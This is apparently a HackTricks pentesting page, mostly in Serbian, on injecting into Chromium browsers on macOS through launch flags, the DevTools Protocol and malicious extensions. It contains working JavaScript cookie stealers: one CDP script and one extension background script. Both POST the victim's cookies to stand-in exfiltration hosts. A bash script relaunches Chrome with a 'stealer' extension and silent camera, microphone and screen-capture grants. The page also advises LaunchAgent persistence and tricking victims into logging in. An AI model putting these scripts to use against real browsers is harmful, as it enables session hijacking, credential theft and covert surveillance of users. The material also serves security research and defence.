# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Osnovne informacije

Chromium-based browsers like Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi, and Opera svi koriste iste command-line switches, preference fajlove i DevTools automation interfejse. Na macOS-u, svaki korisnik sa GUI pristupom može terminirati postojeću browser sesiju i ponovo je otvoriti sa proizvoljnim flags, ekstenzijama ili DevTools endpoint-ima koji se izvršavaju sa entitlements cilja.

#### Pokretanje Chromium-a sa prilagođenim zastavicama na macOS

macOS održava jednu UI instancu po Chromium profilu, tako da instrumentacija obično zahteva prisilno zatvaranje browser-a (na primer sa `osascript -e 'tell application "Google Chrome" to quit'`). Napadači obično ponovo pokreću preko `open -na "Google Chrome" --args <flags>` kako bi injektovali argumente bez modifikovanja app bundle-a. Uvijanje te komande unutar korisničkog LaunchAgent-a (`~/Library/LaunchAgents/*.plist`) ili login hook-a garantuje da će kompromitovani browser biti ponovno pokrenut nakon reboot/logoff-a.

#### `--load-extension` zastavica

`--load-extension` flag automatski učitava unpacked extensions (putanje odvojene zarezom). Kombinujte ga sa `--disable-extensions-except` da blokirate legitimne ekstenzije dok forsirate da samo vaš payload radi. Maliciozne ekstenzije mogu zatražiti visokorizične permisije kao što su `debugger`, `webRequest`, i `cookies` da bi pivotirale u DevTools protocols, patch-ovale CSP headers, downgrade-ovale HTTPS ili eksfiltrirale session materijal čim browser startuje.

#### `--remote-debugging-port` / `--remote-debugging-pipe` zastavice

Ovi switch-evi izlažu Chrome DevTools Protocol (CDP) preko TCP-a ili pipe-a tako da eksterni alati mogu upravljati browser-om. Google je uočio široku zloupotrebu ovog interfejsa od strane infostealera i, počevši od Chrome 136 (March 2025), switch-evi se ignorišu za default profile osim ako browser nije pokrenut sa non-standard `--user-data-dir`. Ovo nameće App-Bound Encryption na pravim profilima, ali napadači i dalje mogu spawn-ovati nov profil, naterati žrtvu da se autentifikuje u njemu (phishing/triage assistance), i harvest-ovati cookies, tokene, device trust state-ove, ili WebAuthn registracije preko CDP-a.

#### `--user-data-dir` zastavica

Ova zastavica preusmerava ceo browser profil (History, Cookies, Login Data, Preference fajlovi, itd.) na putanju pod kontrolom napadača. Neophodna je kada se kombinuju moderni Chrome build-ovi sa `--remote-debugging-port`, i takođe drži kompromitovani profil izolovanim tako da možete ubaciti prethodno popunjene `Preferences` ili `Secure Preferences` fajlove koji onemogućavaju security prompts, auto-install ekstenzija i menjaju default schemes.

#### `--use-fake-ui-for-media-stream` zastavica

Ovaj switch zaobilazi camera/mic permission prompt tako da svaka stranica koja pozove `getUserMedia` odmah dobija pristup. Kombinujte ga sa flag-ovima kao što su `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk`, ili CDP `Browser.grantPermissions` komandama da tihо snimate audio/video, delite desktop, ili zadovoljite WebRTC permission provere bez korisničke interakcije.

## Remote Debugging & DevTools Protocol Abuse

Kada je Chrome ponovo pokrenut sa dedikovanim `--user-data-dir` i `--remote-debugging-port`, možete se priključiti preko CDP-a (npr. preko `chrome-remote-interface`, `puppeteer`, ili `playwright`) i skriptovati visokoprigorske radne tokove:

- **Krađa cookie-/sesije:** `Network.getAllCookies` i `Storage.getCookies` vraćaju HttpOnly vrednosti čak i kada bi App-Bound encryption obično blokirala filesystem pristup, zato što CDP traži od pokrenutog browser-a da ih dekriptira.
- **Manipulacija permisijama:** `Browser.grantPermissions` i `Emulation.setGeolocationOverride` omogućavaju zaobilaženje camera/mic promptova (posebno u kombinaciji sa `--use-fake-ui-for-media-stream`) ili falsifikovanje provera zasnovanih na lokaciji.
- **Injekcija keystroke/script-a:** `Runtime.evaluate` izvršava proizvoljan JavaScript unutar aktivnog taba, omogućavajući podizanje kredencijala, patch-ovanje DOM-a, ili injektovanje persistence beacon-a koji prežive navigaciju.
- **Live eksfiltracija:** `Network.webRequestWillBeSentExtraInfo` i `Fetch.enable` presreću autentifikovane zahteve/odgovore u realnom vremenu bez diranja disk artefakata.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Pošto Chrome 136 blokira CDP na podrazumevanom profilu, kopiranje/premještanje postojeće direktorijume žrtve `~/Library/Application Support/Google/Chrome` u staging putanju više ne daje dešifrovane cookies. Umesto toga, social-engineer korisnika da se prijavi unutar instrumentisanog profila (npr. „korisna“ sesija podrške) ili presretnite MFA tokene u tranzitu putem CDP-controlled network hooks.

## Extension-Based Injection via Debugger API

The 2023 "Chrowned by an Extension" research demonstrated that a malicious extension using the `chrome.debugger` API can attach to any tab and gain the same DevTools powers as `--remote-debugging-port`. That breaks the original isolation assumptions (extensions stay in their context) and enables:

- Tiho krađа cookies i kredencijala pomoću `Network.getAllCookies`/`Fetch.getResponseBody`.
- Izmena dozvola sajta (camera, microphone, geolocation) i zaobilaženje security interstitiala, što omogućava phishing stranicama da se predstavljaju kao Chrome dijalozi.
- On-path manipulacija TLS upozorenjima, preuzimanjima ili WebAuthn promptovima programatskim upravljanjem `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior`, ili `Security.handleCertificateError`.

Učitajte extension pomoću `--load-extension`/`--disable-extensions-except` tako da nije potrebna interakcija korisnika. Minimalan background script koji weaponizuje API izgleda ovako:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Ekstenzija se takođe može pretplatiti na `Debugger.paused` događaje da bi čitala JavaScript promenljive, patch-ovala inline skripte ili ubacivala custom breakpoints koji opstaju kroz navigaciju. Pošto sve radi unutar korisničke GUI sesije, Gatekeeper i TCC se ne aktiviraju, što ovu tehniku čini idealnom za malware koji je već izvršen u korisničkom kontekstu.

### Alati

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatizuje pokretanja Chromium-a sa payload extensions i izlaže interaktivne CDP hooks.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Sličan tooling fokusiran na traffic interception i browser instrumentation za macOS operatore.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js biblioteka za skriptovanje Chrome DevTools Protocol dumps (cookies, DOM, permissions) kada je instanca pokrenuta sa `--remote-debugging-port`.

### Primer
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Pronađite više primera u linkovima alata.

## Reference

- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
